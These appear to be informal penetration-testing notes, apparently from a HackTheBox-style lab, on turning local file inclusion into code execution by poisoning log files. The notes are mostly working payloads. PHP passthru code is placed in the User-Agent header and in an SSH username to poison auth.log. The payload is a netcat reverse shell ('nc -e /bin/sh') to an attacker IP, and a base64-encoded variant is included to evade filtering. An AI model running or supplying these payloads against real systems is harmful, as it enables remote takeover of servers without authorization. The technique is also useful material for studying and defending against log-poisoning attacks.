Local File inclusion.

Try to Inject the code in readable file
/proc/self/environ --> HAve info about current Environment.
/var/log/auth.log
/var/log/apache2/access.log

Modify the useragent with this payload.
<?phpinfo()?>

<?passthru("nc -e /bin/sh 10.10.10.155 1234");?>


----------------------------------------------------------------------
/var/log/auth.log

this contains various log files of the server.

Try to login wishh ssh. usse payload instaed of username.
ssh -oHostKeyAlgorithms=+ssh-dss "<?passthru('nc -e /bin/sh 10.10.10.155 1234');?>"@10.10.10.152

There might be spaces. so base64 encrypt the in the burp
nc -e /bin/sh 10.10.10.155 1234

-Go through Burp decoder option and encytp the payload.
bmMgLWUgL2Jpbi9zaCAxMC4xMC4xMC4xNTUgMTIzNA==

ssh -oHostKeyAlgorithms=+ssh-dss "<?passthru('bmMgLWUgL2Jpbi9zaCAxMC4xMC4xMC4xNTUgMTIzNA==');?>"@10.10.10.152

-Now i need to tell the php to decode it. and execute it.so i wrote a function calle base64_decode.

ssh -oHostKeyAlgorithms=+ssh-dss "<?passthru(base64_decode('bmMgLWUgL2Jpbi9zaCAxMC4xMC4xMC4xNTUgMTIzNA=='));?>"@10.10.10.152


-Enter Random password and hit enter. refresh the web page. youll get shell.
